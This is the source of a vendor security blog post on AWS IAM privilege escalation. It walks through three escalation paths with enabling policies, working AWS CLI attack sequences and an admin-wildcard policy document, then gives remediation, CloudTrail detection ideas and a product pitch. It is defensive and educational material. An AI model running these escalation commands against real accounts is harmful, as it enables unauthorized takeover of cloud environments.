---
layout: ../../layouts/BaseLayout.astro
title: "AWS IAM Privilege Escalation: How Attackers Move Through Your Cloud Account"
description: "Privilege escalation is how a low-privilege AWS identity becomes an administrator. Learn the most common IAM escalation paths, real policy examples that enable them, and how to detect and block them before attackers find them first."
keywords: "AWS privilege escalation, IAM privilege escalation, AWS IAM attack paths, cloud identity attack, AWS lateral movement, IAM security, least privilege AWS"
slug: "blog-03-privilege-escalation"
author: "Gulo AI"
date: "2026-08-09"
tags: ["aws", "iam", "security", "cloud", "cybersecurity"]
published: true
type: "article"
publishDate: "2026-08-15T00:00:00Z"
---

<style>
  .post-hero { padding: 3rem 0; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); color: white; }
  .post-hero .container { max-width: 800px; margin: 0 auto; }
  .post-meta { color: rgba(255,255,255,0.7); margin-bottom: 1rem; font-size: 0.9rem; }
  .post-series { display: inline-block; background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.3); border-radius: 4px; padding: 0.25rem 0.75rem; font-size: 0.8rem; letter-spacing: 0.04em; text-transform: uppercase; margin-bottom: 1rem; }
  .post-body { max-width: 800px; margin: 0 auto; padding: 3rem 1rem; color: var(--color-gray); line-height: 1.8; }
  .post-body h2 { margin-top: 2.5rem; margin-bottom: 1rem; color: var(--color-dark); }
  .post-body h3 { margin-top: 1.75rem; color: var(--color-dark); }
  .post-body ul, .post-body ol { padding-left: 1.5rem; margin-bottom: 1rem; }
  .post-body li { margin-bottom: 0.4rem; }
  .post-body blockquote { border-left: 4px solid var(--color-primary); padding-left: 1.25rem; margin: 1.5rem 0; font-style: italic; color: #555; }
  .path-label { display: inline-block; background: #fff0f0; border: 1px solid #f5c6c6; border-radius: 4px; padding: 0.2rem 0.6rem; font-size: 0.8rem; letter-spacing: 0.04em; text-transform: uppercase; margin-bottom: 0.5rem; }
  .detect-label { display: inline-block; background: #f0f4ff; border: 1px solid #c7d2fe; border-radius: 4px; padding: 0.2rem 0.6rem; font-size: 0.8rem; letter-spacing: 0.04em; text-transform: uppercase; margin-bottom: 0.5rem; }
  .example-block { background: #fafafa; border: 1px solid #e2e8f0; border-radius: 8px; padding: 1.25rem 1.5rem; margin: 1.5rem 0; }
  .example-block h4 { margin: 0 0 0.5rem; color: #c0392b; }
  .cta-block { background: linear-gradient(135deg, #1a1a2e 0%, #0f3460 100%); color: white; border-radius: 10px; padding: 2rem; margin-top: 3rem; }
  .cta-block h3 { color: white; margin-top: 0; }
  .cta-block p { color: rgba(255,255,255,0.85); }
  .cta-block a { display: inline-block; background: white; color: #0f3460; font-weight: 600; padding: 0.65rem 1.5rem; border-radius: 6px; text-decoration: none; margin-top: 0.5rem; }
  .cta-block a:hover { background: #e8ecf5; }
  .back-link { margin-top: 3rem; padding-top: 2rem; border-top: 1px solid var(--color-gray-light); }
  .back-link a { color: var(--color-primary); font-weight: 500; }
</style>

<section class="post-hero">
  <div class="container">
    <div class="post-series">Horizon IAM Risk Series · Part 3 of 5</div>
    <div class="post-meta">August 15, 2026 · 10 min read</div>
    <h1 style="color:white; margin-bottom: 1rem;">AWS IAM Privilege Escalation: How Attackers Move Through Your Cloud Account</h1>
    <p style="color:rgba(255,255,255,0.8); font-size:1.1rem;">How a low-privilege identity turns normal-looking IAM and service permissions into full administrative control.</p>
  </div>
</section>

<div class="post-body">

[Part 2 of this series](/blog/blog-02-dangerous-misconfigurations) focused on dangerous IAM misconfigurations that appear in almost every AWS account. Those misconfigurations are dangerous on their own, but their real impact is what they enable next: a low-privilege attacker identity methodically moving from limited access to full account control.

---

## What Privilege Escalation Means in AWS

In AWS, privilege escalation is not just “getting more access.” It is the process of using **already-permitted API actions** to grant yourself or another principal permissions you were never intended to have.

That distinction matters. Privilege escalation is different from credential theft:

- **Credential theft**: an attacker steals keys, tokens, or a session and uses someone else’s existing permissions.
- **Privilege escalation**: an attacker starts with a valid but limited identity and uses that identity’s allowed actions to create a new, more powerful permission state.

From a defender’s perspective, escalation is harder to spot because API calls often look legitimate in isolation. `iam:CreatePolicyVersion`, `iam:AttachUserPolicy`, or `lambda:CreateFunction` can all be valid operations in normal engineering workflows. The risk is in **who** calls them, **when**, and **in what sequence**.

---

## Escalation Path #1: `iam:CreatePolicyVersion`

<span class="path-label">High-Risk Path</span>

If an attacker can call `iam:CreatePolicyVersion` on a managed policy and set the new version as default, they can effectively overwrite that policy with administrator-level access.

A minimal policy that enables this looks like:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "iam:CreatePolicyVersion",
        "iam:SetDefaultPolicyVersion"
      ],
      "Resource": "arn:aws:iam::*:policy/*"
    }
  ]
}
```

If the attacker can target a policy already attached to their own user or role, the attack sequence is straightforward:

```bash
# 1) Create a new policy version with admin permissions
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/DeveloperPolicy \
  --policy-document file://admin-policy.json \
  --set-as-default

# 2) Confirm effective permissions with a high-privilege test action
aws iam list-users
```

And the injected policy document (`admin-policy.json`) is typically:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
```

### Remediation

- Remove `iam:CreatePolicyVersion` and `iam:SetDefaultPolicyVersion` from non-admin principals.
- Scope these actions to a tightly controlled subset of policy ARNs, if absolutely required.
- Enforce permission boundaries so even modified policies cannot exceed a defined permissions ceiling.

---

## Escalation Path #2: `iam:AttachUserPolicy`

<span class="path-label">High-Risk Path</span>

If an attacker can attach managed policies to identities they control, they can directly add AWS-managed `AdministratorAccess`.

Example permission set:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "iam:AttachUserPolicy"
      ],
      "Resource": [
        "arn:aws:iam::*:user/*"
      ]
    }
  ]
}
```

Attack sequence against a compromised IAM user:

```bash
# Attach AdministratorAccess to the current user
aws iam attach-user-policy \
  --user-name compromised-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Validate by calling a privileged API
aws ec2 describe-instances
```

### Remediation

- Deny `iam:AttachUserPolicy` for non-IAM-admin roles.
- Use explicit deny guardrails at org/account level for attaching `AdministratorAccess`.
- Restrict attachment targets to approved break-glass identities only.

---

## Escalation Path #3: `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`

<span class="path-label">Chained Escalation Path</span>

This is one of the most important AWS escalation chains because each permission can appear harmless when reviewed independently.

The attacker needs three capabilities:

1. `iam:PassRole` for a high-privilege execution role.
2. `lambda:CreateFunction` to launch code under that role.
3. `lambda:InvokeFunction` to execute the payload.

Each step can be granted separately, which is what makes this chain easy to miss in reviews.

Permission 1 (`iam:PassRole`):

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "iam:PassRole",
      "Resource": "arn:aws:iam::123456789012:role/OrganizationAccountAccessRole"
    }
  ]
}
```

Permission 2 (`lambda:CreateFunction`):

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "lambda:CreateFunction",
      "Resource": "*"
    }
  ]
}
```

Permission 3 (`lambda:InvokeFunction`):

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "lambda:InvokeFunction",
      "Resource": "*"
    }
  ]
}
```

Attack sequence:

```bash
# 1) Create function using a high-privilege execution role
aws lambda create-function \
  --function-name escalate-fn \
  --runtime python3.12 \
  --handler index.handler \
  --zip-file fileb://payload.zip \
  --role arn:aws:iam::123456789012:role/OrganizationAccountAccessRole

# 2) Invoke function to perform privileged actions in AWS APIs
aws lambda invoke \
  --function-name escalate-fn \
  response.json
```

Inside `payload.zip`, the function can call privileged APIs like creating new admin users, attaching high-privilege policies, reading secrets, or modifying logging controls.

This is difficult to detect manually because:

- `iam:PassRole` may look normal in CI/CD or serverless workflows.
- Lambda creation is common and high-volume.
- The dangerous signal is the **relationship** between caller, passed role, and immediate invocation timing.

---

## The Compounding Problem: Real Attack Chains Are Multi-Step

In real incidents, attackers rarely rely on a single escalation trick. They chain permissions based on what the compromised identity can do right now.

A common attacker workflow:

1. **Enumerate current privileges** using IAM simulation APIs, failed API response patterns, and service discovery calls.
2. **Probe IAM write capabilities** (`CreatePolicyVersion`, `AttachUserPolicy`, `PutUserPolicy`, etc.).
3. **Check for `iam:PassRole`** and inventory roles with broad permissions.
4. **Look for an execution primitive** (Lambda, ECS task execution, Step Functions integration) to run code under a stronger role.
5. **Establish durable access** by creating new policies, roles, access keys, or trust relationships.
6. **Move laterally** to data stores, KMS keys, secrets managers, and deployment pipelines.

From the attacker’s perspective, this is an optimization exercise: find the shortest permission chain to administrative control without triggering obvious alerts. A read-only foothold becomes dangerous the moment one or two mutation permissions are exposed.

---

## Detection: What to Watch in CloudTrail

<span class="detect-label">Detection Priority</span>

At minimum, build detections for these event patterns:

- `CreatePolicyVersion`
- `AttachUserPolicy`
- `CreateFunction` where `role` ARN is unusual for the calling principal
- `InvokeFunction` occurring shortly after `CreateFunction` by the same principal
- Any IAM write action from principals that do not normally perform IAM administration

Example CloudTrail Lake query pattern (conceptual):

```bash
# Pseudo-query logic
# Find principals that create Lambda functions and invoke them within minutes,
# where the role passed to Lambda is outside expected role allowlists.
```

Operationally, high-fidelity detection requires baselining:

- Which principals typically perform IAM changes?
- Which roles are allowed to be passed by which workloads?
- Which deployment pipelines legitimately create Lambda functions?

Without this context, security teams drown in noisy but technically valid events.

---

## Why Manual Detection Doesn’t Scale

CloudTrail has the evidence, but manual review does not scale in real AWS environments.

The hard part is not finding one suspicious event. The hard part is continuously understanding:

- Effective permissions across hundreds of inline and managed policies,
- Which principals can combine seemingly harmless permissions into known escalation paths,
- Whether new deployments silently introduced fresh escalation opportunities.

That mapping problem is exactly what **Horizon IAM Risk Analyzer** is designed to solve: automatically identifying risky permission combinations and matching them to known IAM escalation techniques before they are exploited.

---

## Close the Escalation Paths Before They’re Used

Privilege escalation is how low-severity IAM drift turns into account-level compromise. If an attacker can mutate IAM state or execute code under stronger roles, they do not need stolen admin credentials — they can build admin access from what already exists.

Horizon IAM Risk Analyzer gives you a practical way to detect and prioritize these paths continuously, not just during quarterly reviews.

<div class="cta-block">
  <h3>Find Your IAM Escalation Paths Before Attackers Do</h3>
  <p>Automatically map privilege-escalation combinations across users, roles, and policies — and remediate the highest-risk paths first.</p>
  <a href="https://aws.amazon.com/marketplace">[Start your free 14-day trial on AWS Marketplace →]</a>
</div>

**Up next — Part 4: Multi-Account IAM Risk.** We’ll cover how escalation paths spread across AWS Organizations, cross-account trusts, and delegated administration models.

<div class="back-link">
  <a href="/blog">← Back to Blog</a>
</div>

</div>
